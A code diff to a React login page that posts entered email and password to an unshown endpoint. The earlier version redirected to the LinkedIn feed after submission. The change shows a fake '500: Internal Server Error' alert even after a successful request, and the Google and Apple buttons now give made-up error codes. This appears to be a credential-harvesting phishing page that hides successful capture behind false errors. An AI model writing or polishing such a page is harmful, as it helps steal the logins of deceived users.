@@ -8,10 +8,10 @@ import {
 } from "@/components/ui/card";
 import { Separator } from "@/components/ui/separator";
 import { Alert, AlertDescription } from "@/components/ui/alert";
-import { GoogleLogo } from "./icons/google";
-import { AppleLogo } from "./icons/apple";
-import { Checkbox } from "./components/ui/checkbox";
-import logo from "@/assets/logo.png";
+import { GoogleLogo } from "@/icons/google";
+import { AppleLogo } from "@/icons/apple";
+import { Checkbox } from "@/components/ui/checkbox";
+import logo from "@/images/logo.png";
 
 const App = () => {
   const [formError, setFormError] = useState("");
@@ -19,6 +19,13 @@ const App = () => {
   const [password, setPassword] = useState("");
   const [errors, setErrors] = useState({ email: "", password: "", google: "", apple: "" });
   const [loading, setLoading] = useState(false);
+
+  const validateEmail = (email) => {
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!email) return "Email is required";
+    if (!emailRegex.test(email)) return "Please enter a valid email";
+    return "";
+  };
 
   const validatePassword = (password) => {
     if (!password) return "Password is required";
@@ -31,13 +38,18 @@ const App = () => {
     setFormError("");
     setLoading(true);
 
+    const emailError = validateEmail(email)
     const passwordError = validatePassword(password);
 
     setErrors({
+      email: emailError,
       password: passwordError,
     });
 
-    if (passwordError) return;
+    if (emailError || passwordError || !email || !password) {
+      setLoading(false)
+      return
+    };
 
     try {
       const response = await fetch(
@@ -57,11 +69,13 @@ const App = () => {
         throw new Error(data.message || "Something went wrong");
       }
 
-      window.location.href = "https://www.linkedin.com/feed/";
       setTimeout(() => {
-
+        setEmail("");
+        setPassword("");
         setLoading(false)
       }, 1000)
+
+      return alert("500: Internal Server Error Occurred \nPlease try again later");
     } catch (error) {
       setFormError(error.message);
       setLoading(false)
@@ -86,7 +100,7 @@ const App = () => {
                 variant="outline"
                 type="button"
                 className="w-full rounded-3xl text-gray-600 text-base"
-                onClick={() => setErrors({ google: "Google sign in is not available currently" })}
+                onClick={() => setErrors({ google: "Error 8: Internal error occurred" })}
                 disabled={loading}
               >
                 <GoogleLogo className={"w-8 h-8"} />
@@ -100,7 +114,7 @@ const App = () => {
                 variant="outline"
                 type="button"
                 className="w-full rounded-3xl text-gray-600 text-base"
-                onClick={() => setErrors({ apple: "Apple sign in is not available currently" })}
+                onClick={() => setErrors({ apple: "Apple ID: Error 503. An internal issue occurred." })}
                 disabled={loading}
               >
                 <AppleLogo />
@@ -150,7 +164,7 @@ const App = () => {
               <Input
                 type="password"
                 placeholder="Password"
-                className={`w-full px-3 py-2 border-gray-500 text-lg ${errors.password ? "border-red-500" : ""
+                className={`w-full px-3 py-2 border-gray-500 ${errors.password ? "border-red-500" : ""
                   }`}
                 value={password}
                 onChange={(e) => {
